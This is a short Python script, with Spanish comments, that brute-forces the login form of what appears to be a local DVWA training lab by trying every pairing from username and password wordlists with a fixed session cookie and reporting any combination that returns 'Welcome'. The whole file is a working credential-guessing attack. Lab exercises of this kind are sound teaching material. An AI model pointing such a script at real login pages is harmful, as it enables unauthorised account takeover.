import requests
import time

# 1. Configuracion de la peticion
url = "http://localhost:4280/vulnerabilities/brute/"
cookie = {"PHPSESSID": "3b07db8af0433930ac763cde9a77b5d2", "security": "low"}

# 2. Carga de diccionarios
try:
    with open("users_cortos.txt", "r") as f_users:
        users = [line.strip() for line in f_users]
    with open("pass_cortas.txt", "r") as f_pass:
        passwords = [line.strip() for line in f_pass]
except FileNotFoundError:
    print("[-] Error: No se encontraron los archivos de diccionario.")
    exit()

print("[*] Iniciando ataque de fuerza bruta con Python...")
start_time = time.time()

# 3. Bucle de ataque (Iteracion de combinaciones)
for u in users:
    for p in passwords:
        payload = {
            "username": u,
            "password": p,
            "Login": "Login"
        }
        
        # 4. Envio de la peticion HTTP GET
        response = requests.get(url, params=payload, cookies=cookie)
        
        # 5. Evaluacion de la respuesta
        if "Welcome" in response.text:
            print(f"[+] ¡Exito! Usuario: {u} | Password: {p}")

end_time = time.time()
print(f"[*] Ataque finalizado en {round(end_time - start_time, 2)} segundos.")
